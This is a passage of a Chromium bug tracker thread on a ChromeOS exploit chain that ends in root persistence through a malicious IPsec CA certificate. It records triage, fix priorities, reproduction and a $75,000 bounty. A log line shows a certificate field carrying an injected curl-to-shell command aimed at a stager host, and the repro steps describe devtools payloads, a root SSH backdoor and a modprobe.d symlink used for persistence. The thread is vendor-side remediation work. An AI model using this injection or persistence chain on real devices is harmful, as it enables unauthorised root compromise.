This just made my radar as the M71 Chrome OS TPM per the tags from #19.  Note that we've already been pushing M71 Stable and we've been told it's critical for other regular security updates.  

The best we'd be able to do is halt the release but that would result in objection from a number of parties.

Is this a halt for the current stable or can it wait for the stable refresh which is likely targeted for the first full week of January (can't be sooner due to holiday non-staffing).

Current versions being pushed are 71.0.3578.94 (11151.59.2), 71.0.3578.94 (11151.59.1, 11151.59.0).


### mn...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### kb...@google.com (2018-12-18)

Just noted that this pertains to eve.  Limited to eve?

It's also not a regression for M71 since it was reported in M70.

The current versions for the eve push are:

71.0.3578.98 (11151.61.0)

### mn...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### mn...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### ke...@google.com (2018-12-18)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-12-18)

kbleicher@, to confirm, this is not a regression so no builds should be suspended over this. We'll fix the exploit in ToT, and then make decisions about what to merge, and how far to do merge, so we don't need immediate action from the release team. 

### mn...@chromium.org (2018-12-18)

Let me downgrade this to high - there's no reason this should be P0 emergency, still top of the priority list for all bug owners though obviously.

Greg, it would be good to figure out what the subset of fixes is that we want to break the important links in the chain.

### ke...@chromium.org (2018-12-18)

We need to at least merge crbug.com/915857 to the next stable build, once it has had bake time. 

### ke...@chromium.org (2018-12-18)

Here's a list of the priority I think we need the potential fixes in. Please let me know if you think I'm misunderstanding somethings priority. Note that we still don't know exactly which fixes will turn out to be practical.

# Critical to fix
1) crbug.com/915857: vpn-manager must sanitize ipsec certificate fields
2) crbug.com/915827: sqlite: disable `sqlite` program
3) crbug.com/780039: kill support for /run/modprobe.d

# Important to fix
4) crbug.com/915819: sqlite3 allows arbitrary binary extension loading
5) crbug.com/916146: memfd_exec() file descriptor can be executed via /proc/PID/fd/N
6) crbug.com/916140:  ￼￼￼/run/ipsec and /run/l2tpipsec_vpn should ideally not be group-writable
7) crbug.com/916152: symlinks in /var/log can be abused to create messy arbitrary file write primitives

# Seatbelt and suspenders fixes
8) crbug.com/915846: chromeos_startup should clear +i (immutable) file attribute under /var
9) crbug.com/915974: implement STATIC_USERMODEHELPER in newer kernels



### mn...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### mo...@chromium.org (2018-12-19)

FWIW, as far as I can tell this exploit chain never worked (was already broken) on M72 since it uses arbitrary command execution in shill to install persistence and there is no viable privesc from shill->root in this exploit as of M72 (shill sandboxing is enabled in M72). Someone please correct me if I'm missing something.

### mo...@chromium.org (2018-12-19)

Then again I guess shill command execution is as good as root command execution (even without a privesc per se) until https://chromium-review.googlesource.com/c/chromiumos/platform2/+/1382641 lands.

### mn...@chromium.org (2018-12-20)

[Empty comment from Monorail migration]

### kb...@google.com (2018-12-20)

Can we remove the RBS given #29, #30?

### ke...@chromium.org (2018-12-20)

RBS or ReleaseBlock-Beta?

### ke...@google.com (2018-12-20)

I thought we agreed this is not RBS.

### ke...@chromium.org (2018-12-20)

Removing RB-[stable,beta] since this isn't a regression. We'll merge fixes when available.

### mn...@chromium.org (2018-12-21)

Rory, I'm trying to replicate test environment. Made some progresss, but now hitting a wall due to this:

Dec 21 15:44:26 cloudimg ipsec[10244]: 00[CFG] loading secrets from '/etc/ipsec.secrets'
Dec 21 15:44:26 cloudimg ipsec[10244]: 00[CFG] expanding file expression '/var/lib/strongswan/ipsec.secrets.inc' failed
Dec 21 15:44:26 cloudimg ipsec[10244]: 00[LIB] building CRED_PRIVATE_KEY - RSA failed, tried 9 builders
Dec 21 15:44:26 cloudimg ipsec[10244]: 00[CFG]   loading private key from '/etc/ipsec.d/private/ca.pem' failed
Dec 21 15:44:26 cloudimg ipsec[10244]: 00[CFG]   loaded RSA private key from '/etc/ipsec.d/private/client.pem'
Dec 21 15:44:26 cloudimg ipsec[10244]: 00[CFG]   loaded IKE secret for %any

It looks like the ca.pem private key you included in ipsec_server.tar.gz is protected by a passphrase:

root@cloudimg:~# openssl rsa -text -in /etc/ipsec.d/private/ca.pem  --passin 'pass:0000'                                            
unable to load Private Key                                                                                                          
139876147646912:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:536:               
139876147646912:error:0906A065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:445:                                  
root@cloudimg:~# openssl rsa -text -in /etc/ipsec.d/private/ca.pem                                                                  
Enter pass phrase for /etc/ipsec.d/private/ca.pem:                                                                                  
aborted!                                                                                                                            
unable to load Private Key                                                                                                          

Can you supply the password or do I need to regenerate keys?

### ro...@rorym.cnamara.com (2018-12-21)

@mnissler, Apologies, the password is 'password', although it should be present in ipsec.secrets.

### sh...@chromium.org (2019-01-04)

kerrnel: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mn...@chromium.org (2019-01-04)

Thanks, password works. Quick status update: Progress, stage 1 connection comes up successfully, stage 2 fails though due to the ca cert not import apparently failing on the device side. Now trying to figure out what's happening there.

### mn...@chromium.org (2019-01-04)

After digging some more, it actually looks like charon receives the CA cert correctly:

2019-01-04T16:49:41.246505+01:00 INFO charon[18606]: 00[CFG] loading ca certificates from '/etc/ipsec.d/cacerts'
2019-01-04T16:49:41.246714+01:00 INFO charon[18606]: 00[CFG]   loaded ca certificate "E=test=x"??leftupdown=/usr/bin/curl https://chromeos-stager.psma.xyz/stage1.sh|/bin/sh??#, OU=x??keyexchange=ikev2??#" from '/etc/ipsec.d/cacerts/cacert.der'

However, it also prints this:

2019-01-04T16:49:41.253715+01:00 INFO charon[18606]: 06[KNL] 192.168.42.1 is not a local address or the interface is down
2019-01-04T16:49:41.259672+01:00 INFO charon[18606]: 06[CFG]   loaded certificate "C=AU, ST=Some-State, O=Internet Widgits Pty Ltd, CN=commonName" from '%smartcard1@crypto_module:16000F74976EA261FFAFAB007FDAE07FE8800B9E'
2019-01-04T16:49:41.259775+01:00 INFO charon[18606]: 06[CFG]   id '%any' not confirmed by certificate, defaulting to 'C=AU, ST=Some-State, O=Internet Widgits Pty Ltd, CN=commonName'
2019-01-04T16:49:41.260519+01:00 INFO charon[18606]: 06[CFG] CA certificate "emailAddress=test=x" not found, discarding CA constraint

and later

2019-01-04T16:49:41.408883+01:00 INFO charon[18606]: 07[IKE] received USE_TRANSPORT_MODE notify
2019-01-04T16:49:41.409333+01:00 INFO charon[18606]: 07[CFG]   using certificate "C=AU, ST=Some-State, O=Internet Widgits Pty Ltd"
2019-01-04T16:49:41.409393+01:00 INFO charon[18606]: 07[CFG]   certificate "C=AU, ST=Some-State, O=Internet Widgits Pty Ltd" key: 4096 bit RSA
2019-01-04T16:49:41.409721+01:00 INFO charon[18606]: 07[CFG]   self-signed certificate "C=AU, ST=Some-State, O=Internet Widgits Pty Ltd" is not trusted
2019-01-04T16:49:41.410055+01:00 INFO charon[18606]: 07[IKE] no trusted RSA public key found for 'C=AU, ST=Some-State, O=Internet Widgits Pty Ltd'

IIUC, it fails to authenticate the server, possibly because it discarded the rightca setting in the config? Interestingly, the loaded ca certificate is listed as E=test=x (note the "E" where you'd expect "emailAddress"). Rory, any chance you can help clarify?


### mn...@chromium.org (2019-01-04)

Ah, E is probably synonym to emailAddress, so that's likely not the problem.

### mn...@chromium.org (2019-01-04)

Hm, the "discarding CA constraint" line might be a red herring as it likely only restricts the CAs the client is willing to trust.

However, the CA cert that gets imported via importONCFile certifies a 512 bit RSA key, whereas the server key appears to be 4096 bits? Are the keys somehow mixed up perhaps?

### mn...@chromium.org (2019-01-04)

Hm, the "discarding CA constraint" line might be a red herring as it likely only restricts the CAs the client is willing to trust.

However, the CA cert that gets imported via importONCFile certifies a 512 bit RSA key, whereas the server key appears to be 4096 bits? Are the keys somehow mixed up perhaps?

### ro...@rorym.cnamara.com (2019-01-04)

@mnissler:

The 512bit RSA key is the actual CA. This is the one that contains the newline exploit. The C=AU, ST=Some-State... CA is the CA for the client certificate/'smartcard'. I'm not sure why it's failing due to lack of trust, it should have been sent by the ipsec server.

Are you able to share more context from net.log? Preferrably from the start of strongswan to when it gives up.

Are you using an internal IPSec server or the stager I set up?

### mn...@chromium.org (2019-01-04)

FWIW, I'm attaching the relevant net.log output from the device in case it helps to diagnose.

### mn...@chromium.org (2019-01-04)

Re https://crbug.com/chromium/915541#c51: I'm using a separate server I have set up.

### ro...@rorym.cnamara.com (2019-01-04)

Based on the logs you've provided, it definitely looks to be that the server CA isn't trusted.

You could try manually trusting the client cert CA (ie etc/ipsec.d/cacerts/ca.pem from ipsec-server.tar.gz). I don't know why this would make a difference because I powerwashed between validation stages, but there's always a chance I made a mess on my device.

### mn...@chromium.org (2019-01-07)

I have now reproduced the chain. Made some further adjustments, listing here for posterity:

1. Regenerated the malicious CA cert to actually certify the client.pem key included in Rory's ipsec_server tarball.
2. Re-pointed all URLs to a hard-coded IP address (192.168.42.1 as per the instructions below) and to use http instead of https to simplify repro steps.
3. Run dropbear on port 1337 so it does not clash with the ssh server running in test images that occupies port 22.

The repro setup runs the exploit server VM image on a workstation and the test image on a physical eve device. The exploit server is then made accessible to the device via an openvpn connection.

Setup steps:

1. Flash the device with the test image for the exact version listed in the bug: https://pantheon.corp.google.com/storage/browser/chromeos-releases/stable-channel/eve/11021.81.0 
2. Download exploit server VM image from https://drive.google.com/open?id=1dFceyv882lgPZiWqd4LxjeEIpiL6Q0Wg and start it (you can log in as root / test0000 via ssh in case you need to diagnose issues):
kvm -m 1024 -drive file=crbug_915541_server.img,if=virtio -serial stdio -vga none -net nic,model=virtio -net user,hostfwd=tcp:127.0.0.1:9223-:22,hostfwd=tcp:127.0.0.1:1194-:1194
3. connect from workstation to device via ssh, mapping the openvpn port to the xpl VM:
ssh -R 1194:localhost:1194 $crosdev
4. reconfigure shill to ignore tun0:
sed 's/BLACKLISTED_DEVICES=$/BLACKLISTED_DEVICES=tun0/' /etc/init/shill.conf > /tmp/shill.conf
mount -o bind /tmp/shill.conf /etc/init/shill.conf 
initctl reload-configuration
stop shill ; start shill  
5. run openvpn on the device (use these exact IP addresses - they're hardcoded in several places):
openvpn --dev tun0 --remote localhost 1194 tcp-client --ifconfig 192.168.42.2 192.168.42.1
6. Log in and verify that you can reach the xpl web server from the device:
http://192.168.42.1

Repro steps (on device):

1. Copy the contents of http://192.168.42.1/payload_net_internals.txt and execute in a chrome://net-internals devtools console. Should say "undefined", no further feedback.
2. Copy the contents of http://192.168.42.1/payload_settings.txt and execute in a chrome://settings devtools console. Should say "undefined", and then you'll the VPN connecting / disconnecting 3 times.
3. An hterm window with a ssh login prompt should appear. Password "EXPLOIT" (no quotes) gives you a root login on localhost
4. You can check that /var/log/update_engine.log is symlinked to /run/modprobe.d
5. Reboot the device
6. Log in
7. The SSH root login should work again. If you don't have the window any longer, you can navigate to chrome-extension://pnhechapfaindjhompbnflcldabbghjo/html/nassh.html#root@127.0.0.1:1337 


### ke...@chromium.org (2019-01-08)

The chain is broken. I am now requesting merges for the sub fixes before marking this Fixed.

### sh...@chromium.org (2019-01-22)

kerrnel: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2019-01-22)

All of the "critical" bugs in the chain are fixed and merged to 72. There are follow up bugs to fix here, but I'm marking this as Fixed.

### sh...@chromium.org (2019-01-23)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-28)

[Empty comment from Monorail migration]

### na...@google.com (2019-01-31)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-01-31)

Thanks for this report. The Panel has decided to reward $75,000 for this report :) 

Unfortunately the report did not qualify for ChromeOS Pwnium Reward since it did not render remote code and did not have guest to guest persistence. 


### na...@google.com (2019-01-31)

[Empty comment from Monorail migration]

### ro...@rorym.cnamara.com (2019-01-31)

Thank you all!!

### mn...@chromium.org (2019-03-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/915541?no_tracker_redirect=1

[Multiple monorail components: OS>Systems, Security]
[Monorail blocked-on: crbug.com/chromium/780039, crbug.com/chromium/915819, crbug.com/chromium/915827, crbug.com/chromium/915846, crbug.com/chromium/915857, crbug.com/chromium/915974, crbug.com/chromium/916140, crbug.com/chromium/916146, crbug.com/chromium/916147, crbug.com/chromium/916152]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093479)*
